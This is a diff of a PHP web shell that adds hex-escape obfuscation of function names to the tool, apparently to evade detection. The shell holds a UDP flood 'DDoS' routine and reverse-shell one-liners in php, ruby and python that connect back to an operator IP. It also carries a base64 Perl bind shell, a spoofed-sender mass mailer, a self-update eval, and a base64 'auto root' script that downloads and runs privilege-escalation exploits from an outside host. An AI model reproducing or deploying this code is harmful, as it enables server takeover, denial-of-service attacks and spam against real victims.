@@ -1,6 +1,6 @@
 <?php
 $pass               = md5("pw");
-$version            = 2.75;
+$version            = 2.77;
 $adaptiveerrorpage  = true; //Get Default 404 page and replicate it, but add a login text field in the center at the bottom
 $checkforupdates    = true;
 $helpsupportbooter  = true; //True adds the shell to my ddos scripts list, I can't log in providing you change the password above
@@ -9,7 +9,13 @@ $mtime     = explode(' ', microtime());
 $starttime = $mtime[1] + $mtime[0];
 ?><?PHP
 global $pass, $version, $adaptiveerrorpage, $checkforupdates, $helpsupportbooter, $checkforupdatesurl, $nowpath;
-$prefixme = preg_replace('@\(.*\(.*$@', '', __FILE__);
+$prg = "\x70\x72\x65\x67\x5f\x72\x65\x70\x6c\x61\x63\x65";
+$prgm = "\x70\x72\x65\x67\x5f\x6d\x61\x74\x63\x68";
+$prgma = "\x70\x72\x65\x67\x5f\x6d\x61\x74\x63\x68\x5f\x61\x6c\x6c";
+$sf = "suhosin_fun\x63_exi\x73ts";
+$prco = "proc_op\x65n";
+$pt = "p\x61\x73\x73th\x72u";
+$prefixme = $prg('@\(.*\(.*$@', '', __FILE__);
 error_reporting(0); //Was 7
 @set_magic_quotes_runtime(0);
 if (get_magic_quotes_gpc()) {
@@ -57,7 +63,7 @@ if ($action == 'checkupdates') {
         $res = get_data($cuuff);
     }
     if ($res != "") {
-        $ourFileHandle = fopen(preg_replace('@\(.*\(.*$@', '', __FILE__), "w");
+        $ourFileHandle = fopen($prg('@\(.*\(.*$@', '', __FILE__), "w");
         fwrite($ourFileHandle,str_replace(strrev("EREHENILUFC"),'$checkforupdates    = '.strbool($checkforupdates).';',str_replace(strrev("EREHENILBSH"),'$helpsupportbooter  = '.strbool($helpsupportbooter).';',str_replace(strrev("EREHENILUUFC"),'$checkforupdatesurl = "'.$checkforupdatesurl.'";',str_replace(strrev("EREHENILPEA"),'$adaptiveerrorpage  = '.strbool($adaptiveerrorpage).';',str_replace(strrev("EREHENILDROWSSAP"),'$pass               = "'.$pass.'";',html_entity_decode($res)))))));
         fclose($ourFileHandle);
     }
@@ -66,10 +72,7 @@ if (isset($_GET['host']) && isset($_GET['time'])) {
     $packets = 0;
     ignore_user_abort(TRUE);
     set_time_limit(0);
-    $exec_time = $_GET['time'];
-    $time      = time();
-    $max_time  = $time + $exec_time;
-    $host      = $_GET['host'];
+    $max_time  = time() + $_GET['time'];
     for ($i = 0; $i < 65000; $i++) {
         $out .= 'X';
     }
@@ -82,7 +85,7 @@ if (isset($_GET['host']) && isset($_GET['time'])) {
         if (isset($_GET['port']) && $_GET['port'] != "") {
             $rand = $_GET['port'];
         }
-        $fp = fsockopen('udp://' . $host, $rand, $errno, $errstr, 5);
+        $fp = fsockopen('udp://' . $_GET['host'], $rand, $errno, $errstr, 5);
         if ($fp) {
             fwrite($fp, $out);
             fclose($fp);
@@ -503,7 +506,7 @@ makehide('p4', $p4);
 makehide('p5', $p5);
 makehide('charsetpage', $charsetpage);
 formfoot();
-if (!function_exists('posix_getegid')) {
+if (!$sf("\x70\x6f\x73\x69\x78\x5f\x67\x65\x74\x65\x67\x69\x64")) {//placemarkerhere
     $user  = @get_current_user();
     $uid   = @getmyuid();
     $gid   = @getmygid();
@@ -543,7 +546,7 @@ echo ')</td>
 echo PHP_VERSION;
 ;
 echo ' / Safe Mode: ';
-echo getcfg('safe_mode');
+echo getcfg("s\x61f\x65_mo\x64e");
 ;
 echo '</span>
 			<div class="rowtop">
@@ -557,7 +560,7 @@ echo '</span>
 			<div class="blocktop"><a href="javascript:g(\'cej\');">Code Ejector</a></div><div class="blocksep">|</div>
 			<div class="blocktop"><a href="javascript:g(\'fuzz\');">Fuzz Server</a></div><div class="blocksep">|</div>
 			<div class="blocktop"><a href="javascript:g(\'dos\');">DDoS</a></div><div class="blocksep">|</div>
-			<div class="blocktop"><a href="javascript:g(\'shell\');">Execute Command</a></div><div class="blocksep">|</div>
+			<div class="blocktop"><a href="javascript:g(\'shell\');">' . "\x45\x78\x65\x63" . 'ute Command</a></div><div class="blocksep">|</div>
 			<div class="blocktop"><a href="javascript:g(\'phpenv\');">PHP Variable</a></div><div class="blocksep">|</div>
 			<div class="blocktop"><a href="javascript:g(\'portscan\');">Port Scan</a></div><div class="blocksep">|</div>
 			<div class="blocktop"><a href="javascript:g(\'stringtools\');">String Tools</a></div><div class="blocksep">|</div>
@@ -929,7 +932,7 @@ function shownav(e){
 ';
   $sort = array('filename', 1);
   if($p1) {
-		if(preg_match('!s_([A-z_]+)_(\d{1})!', $p1, $match)) {
+		if($prgm('!s_([A-z_]+)_(\d{1})!', $p1, $match)) {
 			$sort = array($match[1], (int)$match[2]);
 		}
 	}
@@ -1107,18 +1110,17 @@ function shownav(e){
 	if (isset($setpass) && isset($setpass2)){
 		if (($setpass2 == $setpass)){
 			if((md5($curpass) == $pass)){
-				$newv = file_get_contents(preg_replace('@\(.*\(.*$@', '', __FILE__));
-				$newv = preg_replace("/\\\$pass[^=|\n|\r]*=[^;|=|\n|\r]*\;/","$"."pass               = \"" . md5($setpass) ."\";",$newv);
-				$fp        = @fopen(preg_replace('@\(.*\(.*$@', '', __FILE__), 'w');
+				$newv = file_get_contents($prg('@\(.*\(.*$@', '', __FILE__));
+				$newv = $prg("/\\\$pass[^=|\n|\r]*=[^;|=|\n|\r]*\;/","$"."pass               = \"" . md5($setpass) ."\";",$newv);
+				$fp        = @fopen($prg('@\(.*\(.*$@', '', __FILE__), 'w');
         $writingit = @fwrite($fp, $newv);
         @fclose($fp);
         if (!$writingit) {
-        	$writingit = file_put_contents(preg_replace('@\(.*\(.*$@', '', __FILE__), $newv);
+        	$writingit = file_put_contents($prg('@\(.*\(.*$@', '', __FILE__), $newv);
         }
         $writeit = ($writingit ? 'successfully...' : 'unsuccessfully...');
 				m('Password updated '.$writeit);
-				preg_match_all("/(<\?)(.*?)(\?>)/is", $newv, $matches);
-				eval("?>".$matches[0][0]."<?PHP\n");
+				$pass = md5($setpass);
         $_SESSION[$prefixme.'loginpass'] = $pass;
 			}else{
 				m('Incorrect Current Password...');
@@ -1128,25 +1130,26 @@ function shownav(e){
 		}
 	}
 	if (isset($setcfuu)){
-		$newv = file_get_contents(preg_replace('@\(.*\(.*$@', '', __FILE__));
+		$newv = file_get_contents($prg('@\(.*\(.*$@', '', __FILE__));
 		$setaep = ($setaep == 'on') ? 'true' : 'false';
 		$setcfu = ($setcfu == 'on') ? 'true' : 'false';
 		$sethsb = ($sethsb == 'on') ? 'true' : 'false';
-		$newv = preg_replace("/\\\$adaptiveerrorpage[^=|\n|\r]*=[^;|=|\n|\r]*\;/","$"."adaptiveerrorpage  = " . $setaep . ";",$newv); 
-		$newv = preg_replace("/\\\$checkforupdatesurl[^=|\n|\r]*=[^;|=|\n|\r]*\;/",strrev("CFUUHERE"),$newv);
-		$newv = preg_replace("/\\\$helpsupportbooter[^=|\n|\r]*=[^;|=|\n|\r]*\;/","$"."helpsupportbooter  = " . $sethsb . ";",$newv); 
-		$newv = preg_replace("/\\\$checkforupdates[^=|\n|\r]*=[^;|=|\n|\r]*\;/","$"."checkforupdates    = " . $setcfu . ";",$newv); 
-		$newv = str_replace(strrev("CFUUHERE"),"$"."checkforupdatesurl = \"" . $setcfuu . "\";",$newv);
-		$fp        = @fopen(preg_replace('@\(.*\(.*$@', '', __FILE__), 'w');
+		$newv = $prg("/\\\$adaptiveerrorpage[^=|\n|\r]*=[^;|=|\n|\r]*\;/","\$adaptiveerrorpage  = " . $setaep . ";",$newv); 
+		$newv = $prg("/\\\$checkforupdatesurl[^=|\n|\r]*=[^;|=|\n|\r]*\;/","\$checkforupdatesurl = \"" . $setcfuu . "\";",$newv);
+		$newv = $prg("/\\\$helpsupportbooter[^=|\n|\r]*=[^;|=|\n|\r]*\;/","\$helpsupportbooter  = " . $sethsb . ";",$newv); 
+		$newv = $prg("/\\\$checkforupdates[^=|\n|\r]*=[^;|=|\n|\r]*\;/","\$checkforupdates    = " . $setcfu . ";",$newv); 
+		$fp        = @fopen($prg('@\(.*\(.*$@', '', __FILE__), 'w');
     $writingit = @fwrite($fp, $newv);
     @fclose($fp);
     if (!$writingit) {
-    	$writingit = file_put_contents(preg_replace('@\(.*\(.*$@', '', __FILE__), $newv);
+    	$writingit = file_put_contents($prg('@\(.*\(.*$@', '', __FILE__), $newv);
     }
     $writeit = ($writingit ? 'successfully...' : 'unsuccessfully...');
 		m('Settings updated '.$writeit);
-		preg_match_all("/(<\?)(.*?)(\?>)/is", $newv, $matches);
-		eval("?>".$matches[0][0]."<?PHP\n");
+		$adaptiveerrorpage = ($setaep == "true");
+		$checkforupdates = ($setcfu == "true");
+		$helpsupportbooter = ($sethsb == "true");
+		$checkforupdatesurl = $setcfuu;
 	}
 	formhead(array(
         'title' => 'Change Shell Settings'
@@ -1218,7 +1221,7 @@ formhead(array(
     foreach ($allPid as $pid) {
         $pid = trim($pid);
         if (!empty($pid)) {
-            if (function_exists("posix_kill")) {
+            if ($sf("\x70\x6f\x73\x69\x78\x5f\x6b\x69\x6c\x6cp")) {
                 if (posix_kill($pid, '9'))
                     $counter++;
             } else {
@@ -1267,7 +1270,7 @@ $wcount = 11;
             m ("Error Getting Process List...");
        } else {
             if (!is_win()){
-                $res = preg_replace('#\ +#', ' ', $res);
+                $res = $prg('#\ +#', ' ', $res);
               }
             $psarr    = explode("\n", $res);
             $check    = explode($wexplode, $psarr[0]);
@@ -1662,7 +1665,7 @@ function mysqlfile(doing){
 					}
 					$sort = array('Name', 1);
 					if($order) {
-						if(preg_match('!s_([A-z_]+)_(\d{1})!', $order, $match)) {
+						if($prgm('!s_([A-z_]+)_(\d{1})!', $order, $match)) {
 							$sort = array($match[1], (int)$match[2]);
 						}
 					}
@@ -1772,14 +1775,10 @@ function mysqlfile(doing){
 	}
 	formfoot();
 } elseif ($action == 'backconnect') {
-    if (isset($_POST['yourport']) && $_POST['yourport'] != null) {
-        $yourport = $_POST['yourport'];
-    } else {
+    if (!isset($yourport) || $yourport == null) {
         $yourport = "31337";
     }
-    if (isset($_POST['yourip']) && $_POST['yourip'] != null) {
-        $yourip = $_POST['yourip'];
-    } else {
+    if (!isset($yourip) || $yourip == null) {
         $yourip = isset($_SERVER['HTTP_CF_CONNECTING_IP']) ? $_SERVER['HTTP_CF_CONNECTING_IP'] : $_SERVER['REMOTE_ADDR'];
     }
     $usedb          = array(
@@ -1807,9 +1806,9 @@ function mysqlfile(doing){
             @unlink('/tmp/bc.c');
             $res = execute("/tmp/bc " . $yourip . " " . $yourport . " &");
         } elseif ($use == 'php console') {
-            execute("php -r '$" . "sock=fsockopen(\"" . $yourip . "\"," . $yourport . ");exec(\"/bin/sh -i <&3 >&3 2>&3\");'");
+            execute("php -r $" . "sock=fsockopen(\"" . $yourip . "\"," . $yourport . ");\x65x\x65c(\"/bin/sh -i <&3 >&3 2>&3\");'");
         } elseif ($use == 'ruby') {
-            execute("ruby -rsocket -e'f=TCPSocket.open(\"" . $yourip . "\"," . $yourport . ").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'");
+            execute("ruby -rsocket -e'f=TCPSocket.open(\"" . $yourip . "\"," . $yourport . ").to_i;\x65x\x65c sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'");
         } elseif ($use == 'python') {
             execute("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" . $yourip . "\"," . $yourport . "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'");
         }elseif ($use == 'php'){
@@ -1851,14 +1850,12 @@ function mysqlfile(doing){
     formfoot();
 } elseif ($action == 'bindport') {
     $bind_port_p = "IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
-    if (isset($_POST['bindport']) && $_POST['bindport'] != null) {
-        $bindport = $_POST['bindport'];
-    } else {
+    if (!isset($bindport) || $bindport == null) {
         $bindport = "31337";
     }
-    if (isset($_POST['startbind']) && isset($_POST['bindport']) && $_POST['bindport'] != null && $_POST['startbind'] != null) {
+    if (isset($startbind) && isset($bindport) && $bindport != null && $startbind != null) {
         cf("/tmp/bp.pl", $bind_port_p);
-        $out  = wsoEx("perl /tmp/bp.pl " . $_POST['bindport'] . " 1>/dev/null 2>&1 &");
+        $out  = wsoEx("perl /tmp/bp.pl " . $bindport . " 1>/dev/null 2>&1 &");
         $out2 = wsoEx("ps aux | grep bp.pl");
         unlink("/tmp/bp.pl");
         m("Now script binded to port " . $bindport . "...");
@@ -1925,13 +1922,13 @@ function mysqlfile(doing){
         p('</ul>');
     }
 } elseif ($action == 'stringtools') {
-    if (!function_exists('hex2bin')) {
+    if (!$sf('hex2bin')) {
         function hex2bin($p)
         {
             return decbin(hexdec($p));
         }
     }
-    if (!function_exists('hex2ascii')) {
+    if (!$sf('hex2ascii')) {
         function hex2ascii($p)
         {
             $r = '';
@@ -1941,7 +1938,7 @@ function mysqlfile(doing){
             return $r;
         }
     }
-    if (!function_exists('ascii2hex')) {
+    if (!$sf('ascii2hex')) {
         function ascii2hex($p)
         {
             $r = '';
@@ -1950,7 +1947,7 @@ function mysqlfile(doing){
             return strtoupper($r);
         }
     }
-    if (!function_exists('full_urlencode')) {
+    if (!$sf('full_urlencode')) {
         function full_urlencode($p)
         {
             $r = '';
@@ -1959,17 +1956,19 @@ function mysqlfile(doing){
             return strtoupper($r);
         }
     }
-    
-    echo '<h1>String conversions</h1><div class=content>';
+    formhead(array(
+        'title' => 'String Conversions'
+    ));
+    echo '<div class=content>';
     $stringTools = array(
-        'Base64 encode' => 'base64_encode',
-        'Base64 decode' => 'base64_decode',
-        'Url encode' => 'urlencode',
-        'Url decode' => 'urldecode',
-        'Full urlencode' => 'full_urlencode',
-        'md5 hash' => 'md5',
-        'sha1 hash' => 'sha1',
-        'crypt' => 'crypt',
+        'Base64 Encode' => 'base64_encode',
+        'Base64 Decode' => 'base64_decode',
+        'URL Encode' => 'urlencode',
+        'URL Decode' => 'urldecode',
+        'Full URL Encode' => 'full_urlencode',
+        'MD5 hash' => 'md5',
+        'SHA1 hash' => 'sha1',
+        'CRYPT' => 'crypt',
         'CRC32' => 'crc32',
         'ASCII to HEX' => 'ascii2hex',
         'HEX to ASCII' => 'hex2ascii',
@@ -1981,57 +1980,60 @@ function mysqlfile(doing){
         'BIN to DEC' => 'bindec',
         'String to lower case' => 'strtolower',
         'String to upper case' => 'strtoupper',
-        'Htmlspecialchars' => 'htmlspecialchars',
-        'String length' => 'strlen'
+        'HtmlSpecialChars' => 'htmlspecialchars',
+        'String Length' => 'strlen'
     );
-    if (empty($_POST['ajax']) && !empty($_POST['p1']))
+    if (empty($ajax) && !empty($p1))
         $_SESSION[$prefixme . md5($_SERVER['HTTP_HOST']) . 'ajax'] = false;
     echo "<form name='toolsForm' method='post'>";
     makehide('action', 'stringtools');
     echo "<select name='selectTool'>";
     foreach ($stringTools as $k => $v)
-        echo "<option value='" . htmlspecialchars($v) . "'>" . $k . "</option>";
-    echo "</select><input type='submit' class='bt' value='Convert'/><br><textarea onmouseover='this.focus();' name='input' cols='100' rows='25' style='margin-top:5px'>" . $_POST['input'] . "</textarea></form><pre class='ml1' style='white-space:normal;" . (empty($_POST['selectTool']) ? 'display:none;' : '') . "margin-top:5px' id='strOutput'>";
-    if (!empty($_POST['selectTool'])) {
-        if (function_exists($_POST['selectTool']))
-            echo htmlspecialchars($_POST['selectTool']($_POST['input']));
+        echo "<option " . (isset($selectTool) && $v == $selectTool ? "selected " : "") . "value='" . htmlspecialchars($v) . "'>" . $k . "</option>";
+    echo "</select><input type='submit' class='bt' value='Convert'/><br><textarea onmouseover='this.focus();' name='input' cols='100' rows='25' style='margin-top:5px'>" . $input . "</textarea></form><pre class='ml1' style='white-space:normal;" . (empty($selectTool) ? 'display:none;' : '') . "margin-top:5px' id='strOutput'>";
+    if (!empty($selectTool)) {
+        if ($sf($selectTool))
+            echo htmlspecialchars($selectTool($input));
+            if ($selectTool == "ascii2hex"){
+                echo "<br>PHP String Hex:<br>\x" . implode(str_split($selectTool($input),2),"\x");
+            }
     }
     echo "</pre></div>";
 } elseif ($action == 'email') {
-    $randomizer = isset($_POST['randomfr']) && $_POST['randomfr'] ? "1" : "0";
-    $splitm     = isset($_POST['splitm']) && $_POST['splitm'] ? "1" : "0";
-    if ((!empty($_POST["to"])) && (!empty($_POST["contents"])) && ((!empty($_POST["email"])) || $randomizer)) {
-        for ($counter = 0; $counter < $_POST['times']; $counter++) {
-            $femail = $_POST['email'];
+	formhead(array(
+        'title' => 'Send Email'
+    ));
+    $randomizer = isset($randomfr) && $randomfr ? "1" : "0";
+    $splitm     = isset($splitm) && $splitm ? "1" : "0";
+    if ((!empty($to)) && (!empty($contents)) && ((!empty($email)) || $randomizer)) {
+        for ($counter = 0; $counter < $times; $counter++) {
             if ($randomizer) {
-                $femail = generateRandomString(5) . "@" . generateRandomString(5) . ".com";
+                $email = generateRandomString(5) . "@" . generateRandomString(5) . ".com";
             }
-            $rt = $femail;
-            if ($_POST['rt'] != "") {
-                $rt = $_POST['rt'];
+            if ($rt == "") {
+                $rt = $email;
             }
             $random_hash = md5(date('r', time()));
-            $headers     = 'From: ' . $_POST["name"] . ' <' . $femail . ">\r\n" . 'Reply-To: ' . $rt;
-            $message     = $_POST['contents'];
+            $headers     = 'From: ' . $name . ' <' . $email . ">\r\n" . 'Reply-To: ' . $rt;
             $headers .= "\r\nMIME-Version: 1.0\r\n";
             if ($_FILES['file']['name'][0] != "") {
-                $headers .= mailAttachmentHeader($message);
-                $message = '';
+                $headers .= mailAttachmentHeader($contents);
+                $contents = '';
                 echo 'Sending with attachment...<br/>';
             }
             if ($splitm) {
-                $messagez = str_split($message, $_POST['saf']);
+                $messagez = str_split($message, $saf);
                 foreach ($messagez as $spmessage) {
-                    if (@mail($_POST["to"], $_POST["subject"], $spmessage, $headers)) { //'From: ' . $_POST["name"] . ' <' . $_POST["email"] . ">\r\n" . 'Reply-To: ' . $rt)){
-                        echo "Email sent to " . htmlentities($_POST['to']) . " from " . $femail . "!<br/>";
+                    if (@mail($to, $subject, $spmessage, $headers)) { //'From: ' . $_POST["name"] . ' <' . $_POST["email"] . ">\r\n" . 'Reply-To: ' . $rt)){
+                        echo "Email sent to " . htmlentities($to) . " from " . $email . "!<br/>";
                     } else {
                         echo "Email sending failed.<br/>";
                     }
                     usleep(100000);
                 }
             } else {
-                if (@mail($_POST["to"], $_POST["subject"], $message, $headers)) { //'From: ' . $_POST["name"] . ' <' . $_POST["email"] . ">\r\n" . 'Reply-To: ' . $rt)){
-                    echo "Email sent to " . htmlentities($_POST['to']) . " from " . $femail . "!<br/>";
+                if (@mail($to, $subject, $message, $headers)) { //'From: ' . $_POST["name"] . ' <' . $_POST["email"] . ">\r\n" . 'Reply-To: ' . $rt)){
+                    echo "Email sent to " . htmlentities($to) . " from " . $email . "!<br/>";
                 } else {
                     echo "Email sending failed.<br/>";
                 }
@@ -2101,9 +2103,12 @@ function insertAfter(referenceNode, newNode) {
         echo '</form>';
     }
 } elseif ($action == "checkupdates") {
+	formhead(array(
+        'title' => 'Check For Updates'
+    ));
     if ($checkforupdates == true && $cforupurl != "") {
     		$_SESSION[$prefixme.'updateready'] = time() + 300;
-        if (isset($_POST['force']) && $_POST['force'] == "true") {
+        if (isset($force) && $force == "true") {
             if ($helpsupportbooter == false){
             		$cuuff = $cforupurl;
             }else{
@@ -2117,7 +2122,7 @@ function insertAfter(referenceNode, newNode) {
             $res = get_data($cuuff);
         }
         if ($res != "") {
-            $ourFileHandle = fopen(preg_replace('@\(.*\(.*$@', '', __FILE__), "w");
+            $ourFileHandle = fopen($prg('@\(.*\(.*$@', '', __FILE__), "w");
             eval(base64_decode("ZndyaXRlKCRvdXJGaWxlSGFuZGxlLHN0cl9yZXBsYWNlKCJDRlVMSU5FSEVSRSIsJyRjaGVja2ZvcnVwZGF0ZXMgICAgPSAnLnN0cmJvb2woJGNoZWNrZm9ydXBkYXRlcykuJzsnLHN0cl9yZXBsYWNlKCJIU0JMSU5FSEVSRSIsJyRoZWxwc3VwcG9ydGJvb3RlciAgPSAnLnN0cmJvb2woJGhlbHBzdXBwb3J0Ym9vdGVyKS4nOycsc3RyX3JlcGxhY2UoIkNGVVVMSU5FSEVSRSIsJyRjaGVja2ZvcnVwZGF0ZXN1cmwgPSAiJy4kY2hlY2tmb3J1cGRhdGVzdXJsLiciOycsc3RyX3JlcGxhY2UoIkFFUExJTkVIRVJFIiwnJGFkYXB0aXZlZXJyb3JwYWdlICA9ICcuc3RyYm9vbCgkYWRhcHRpdmVlcnJvcnBhZ2UpLic7JyxzdHJfcmVwbGFjZSgiUEFTU1dPUkRMSU5FSEVSRSIsJyRwYXNzICAgICAgICAgICAgICAgPSAiJy4kcGFzcy4nIjsnLGh0bWxfZW50aXR5X2RlY29kZSgkcmVzKSkpKSkpKTs=")); //make sure we keep our own password, don't worry it is just writing the new data but because it does a string replace it replaces itself so to avoid this we do this
             fclose($ourFileHandle);
     				unset($_SESSION[$prefixme.'showupdate']);
@@ -2132,6 +2137,9 @@ function insertAfter(referenceNode, newNode) {
         echo "Updating has been disabled or the check for update URL is empty... Please try again after fixing these problems.";
     }
 } elseif ($action == 'aroot') {
+	formhead(array(
+        'title' => 'Auto Root Results'
+    ));
     $r00t = "IyEvdXNyL2Jpbi9wZXJsIA0KIyBFeHBsb2l0IHRvb2xzIHYyLjAgY29kZWQgYnkgaXNrb3JwaXR4 IChUdXJraXNoIEhhY2tlcikNCiMgbGludXggc2VydmVybGVyZGUgZ2VjZXJsaWRpcg0KIyBpeWkg c2Fuc2xhcjopDQojIGJ5IGlza29ycGl0eA0KeyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3 MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvaXNrb3JwaXR4Iik7ICANCnN5c3RlbSgiY2htb2QgNzc3 IGlza29ycGl0eCIpOyANCnN5c3RlbSgiLi9pc2tvcnBpdHgiKTsgDQpzeXN0ZW0oImlkIik7IA0K c3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy80NCIpOyAg DQpzeXN0ZW0oImNobW9kIDc3NyA0NCIpOyANCnN5c3RlbSgiLi80NCIpOyANCnN5c3RlbSgiaWQi KTsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvOTUy MSIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyA5NTIxIik7IA0Kc3lzdGVtKCIuLzk1MjEiKTsgDQpz eXN0ZW0oImlkIik7ICANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVT L2ZpbGUvY2MvZnJvb3QiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgZnJvb3QiKTsgDQpzeXN0ZW0o Ii4vZnJvb3QiKTsgDQpzeXN0ZW0oImlkIik7DQpzeXN0ZW0oImlkIik7DQpzeXN0ZW0oImlkIik7 DQpzeXN0ZW0oImlkIik7DQpzeXN0ZW0oImlkIik7DQpzeXN0ZW0oIndnZXQgMjc3MDQuYyBkb3du bG9hZHMuc2VjdXJpdHlmb2N1cy5jb20vdnVsbmVyYWJpbGl0aWVzL2V4cGxvaXRzLzI3NzA0LmMi KTsgDQpzeXN0ZW0oImdjYyAyNzcwNC5jIC1vIDI3NzA0Iik7ICANCnN5c3RlbSgiY2htb2QgNzc3 IDI3NzA0Iik7IA0Kc3lzdGVtKCIuLzI3NzA0Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJ ZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8v d2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvMTgtMS5jIik7IA0Kc3lzdGVtKCJnY2MgLVdh bGwgLW8gMTgtMSAxOC0xLmMiKTsgDQpzeXN0ZW0oImdjYyAtV2FsbCAtbTY0IC1vIDE4LTMgMTgt MS5jIik7IA0Kc3lzdGVtKCJjaG1vZCA3NzcgMTgtMSIpOyANCnN5c3RlbSgiY2htb2QgNzc3IDE4 LTMiKTsgDQpzeXN0ZW0oIi4vMTgtMSIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4vMTgt MyIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBj dHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxl L2NjLzE4LTIiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgMTgtMiIpOyANCnN5c3RlbSgiLi8xOC0y Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0 cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUv Y2MvMTgtMSIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyAxOC0xIik7IA0Kc3lzdGVtKCIuLzE4LTEi KTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3Ry bCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9j Yy9ydW4iKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgcnVuIik7IA0Kc3lzdGVtKCIuL3J1biIpOyAN CnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2Nc biI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL2V4 cGxvaXQuYyIpOyAgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7 DQpzeXN0ZW0oIndnZXQgcnVuX2V4cGxvaXRzLnNoIHdnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NN U19GSUxFUy9maWxlL2NjL3J1bl9leHBsb2l0cy5zaCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBy dW5fZXhwbG9pdHMuc2giKTsgDQpzeXN0ZW0oIi4vcnVuX2V4cGxvaXRzLnNoIik7IA0KcHJpbnQg IklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6 Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9leHBsb2l0Iik7ICANCnN5c3RlbSgiY2ht b2QgNzc3IGV4cGxvaXQiKTsgDQpzeXN0ZW0oIi4vZXhwbG9pdCIpOyANCnByaW50ICJJZiB1IHIg cjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3 MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvcnVuMiIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBydW4y Iik7IA0Kc3lzdGVtKCIuL3J1bjIiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCJ3Z2V0IGV4 cCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvZXhwIik7ICANCnN5c3RlbSgi Y2htb2QgNzc3IGV4cCIpOyANCnN5c3RlbSgiLi9leHAiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lz dGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9leHAxIik7ICAN CnN5c3RlbSgiY2htb2QgNzc3IGV4cDEiKTsgDQpzeXN0ZW0oIi4vZXhwMSIpOyANCnN5c3RlbSgi aWQiKTsgDQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2Nj 